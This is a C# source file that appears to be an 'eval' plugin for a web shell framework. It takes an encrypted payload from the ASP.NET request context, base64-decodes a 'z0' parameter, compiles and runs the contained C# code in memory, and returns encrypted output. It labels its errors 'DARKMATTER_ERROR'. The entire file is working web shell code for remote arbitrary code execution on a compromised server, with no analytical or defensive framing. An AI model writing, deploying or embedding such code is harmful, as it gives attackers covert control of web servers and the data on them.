using System;
using System.Web;
using System.IO;
using System.Diagnostics;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Threading;
using System.CodeDom.Compiler;
using Microsoft.CSharp;

public class eval
{
    private Dictionary<string, string> fnParseParams(string szParam)
    {
        Dictionary<string, string> dic = new Dictionary<string, string>();
        if (string.IsNullOrEmpty(szParam))
            return dic;

        string[] pairs = szParam.Split('&');
        foreach (string szPair in pairs)
        {
            int nIdx = szPair.IndexOf("=");
            if (nIdx > 0)
                dic[szPair.Substring(0, nIdx).Trim()] = szPair.Substring(nIdx + 1).Trim();
        }

        return dic;
    }

    private string fnB64Encode(string szInput) => Convert.ToBase64String(Encoding.UTF8.GetBytes(szInput));
    private string fnB64Decode(string szInput) => Encoding.UTF8.GetString(Convert.FromBase64String(szInput));

    private void fnWriteOutput(object driver, HttpResponse response, byte[] abOutput)
    {
        var cryptMethod = driver.GetType().GetMethod("Crypt", new Type[] { typeof(byte[]), typeof(int) });
        byte[] abEncryptedResp = (byte[])cryptMethod.Invoke(driver, new object[] { abOutput, 1 });

        response.Clear();
        response.ContentType = "application/octet-stream";
        response.BinaryWrite(abEncryptedResp);
    }

    private string ExecuteDynamicCode(string csharpCodeSnippet)
    {
        string fullSource = $@"
            using System;
            using System.IO;
            using System.Text;
            using System.Collections.Generic;
            using System.Diagnostics;

            public class DynamicClass 
            {{
                public object Execute() 
                {{
                    {csharpCodeSnippet}
                }}
            }}";

        CompilerParameters parameters = new CompilerParameters
        {
            GenerateInMemory = true,
            GenerateExecutable = false
        };
        
        parameters.ReferencedAssemblies.Add("System.dll");
        parameters.ReferencedAssemblies.Add("System.Core.dll");

        using (CSharpCodeProvider provider = new CSharpCodeProvider())
        {
            CompilerResults results = provider.CompileAssemblyFromSource(parameters, fullSource);

            if (results.Errors.HasErrors)
            {
                StringBuilder sbErrors = new StringBuilder();
                sbErrors.AppendLine("COMPILER_ERROR:");
                foreach (CompilerError error in results.Errors)
                {
                    sbErrors.AppendLine($"Line {error.Line}: {error.ErrorText}");
                }
                return sbErrors.ToString();
            }

            Assembly assembly = results.CompiledAssembly;
            object instance = assembly.CreateInstance("DynamicClass");
            MethodInfo method = instance.GetType().GetMethod("Execute");

            object result = method.Invoke(instance, null);
            return result != null ? result.ToString() : "null (No return value)";
        }
    }

    public bool Run()
    {
        HttpContext context = HttpContext.Current;
        if (context == null)
            return false;

        HttpRequest request = context.Request;
        HttpResponse response = context.Response;

        try
        {
            byte[] abPayload = (byte[])context.Items["payload"];
            object driver = context.Items["driver"];
            int nDllLength = (int)context.Items["len"];

            int nParamOffset = nDllLength + 4;
            int nParamLength = abPayload.Length - nParamOffset;
            string szParam = Encoding.UTF8.GetString(abPayload, nParamOffset, nParamLength).Trim();

            Dictionary<string, string> dic = fnParseParams(szParam);
            
            string szCode = fnB64Decode(dic["z0"]);

            string executionResult = ExecuteDynamicCode(szCode);

            fnWriteOutput(driver, response, Encoding.UTF8.GetBytes(executionResult));
        }
        catch (Exception ex)
        {
            response.Write("DARKMATTER_ERROR: " + ex.Message);
        }

        return true;
    }
}